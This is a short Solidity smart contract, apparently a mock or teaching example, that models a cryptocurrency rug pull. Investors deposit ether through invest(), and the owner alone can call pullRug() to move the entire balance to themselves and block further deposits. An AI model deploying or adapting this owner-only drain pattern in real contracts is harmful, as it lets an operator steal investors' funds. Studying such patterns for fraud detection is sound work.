// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;  

contract MockRugPull {  
    address private _owner;  
    bool private _pulled;  

    constructor() payable {  
        _owner = msg.sender;  
    }  

    function invest() external payable {  
        require(!_pulled, "Too late!");  
    }  

    function pullRug() external {  
        require(msg.sender == _owner, "Not owner");  
        payable(_owner).transfer(address(this).balance);  
        _pulled = true;  
    }  
}  
